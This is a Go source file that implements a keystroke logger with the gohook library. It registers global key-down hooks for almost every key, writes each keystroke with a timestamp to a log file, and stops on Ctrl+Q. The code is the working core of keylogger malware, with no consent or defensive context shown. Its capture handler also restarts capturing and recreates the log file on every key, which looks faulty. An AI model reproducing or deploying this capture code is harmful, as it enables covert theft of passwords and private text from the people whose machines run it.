package main

import (
	"sync"
	"time"

	keyHook "github.com/robotn/gohook"
)

var KeyCodes = []string{"`", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "+", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\\", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12", "esc", "delete", "tab", "ctrl", "control", "alt", "space", "shift", "rshift", "enter", "cmd", "command", "rcmd", "ralt", "up", "down", "left", "right"}

var KeyEvent keyHook.Event

var keyMutex sync.Mutex

func registerKeystrokes() {
	keyHook.Register(keyHook.KeyDown, []string{"ctrl", "q"}, func(event keyHook.Event) {
		appendToFile(LogFileHandle, []byte("[*] Stop capturing....\n\n------------------------------------------------\n\n"))
		keyHook.End()
	})

	for _, key := range KeyCodes {
		keyHook.Register(keyHook.KeyDown, []string{key}, func(event keyHook.Event) {
			keyMutex.Lock()
			defer keyMutex.Unlock()
			datetime := time.Now()
			message := "[" + datetime.Format("01-02-2006 15:04:05") + "] Key: " + string(event.Keychar) + "\n"
			appendToFile(LogFileHandle, []byte(message))

			keyHook.StopEvent()
			time.Sleep(time.Millisecond * 500)
			startCapturing(LogFilePath)
		})
	}
}

func startCapturing(logFileName string) {
	LogFileHandle, _ = createFile(LogFilePath)
	KeyEvent := keyHook.Start()
	<-keyHook.Process(KeyEvent)
}
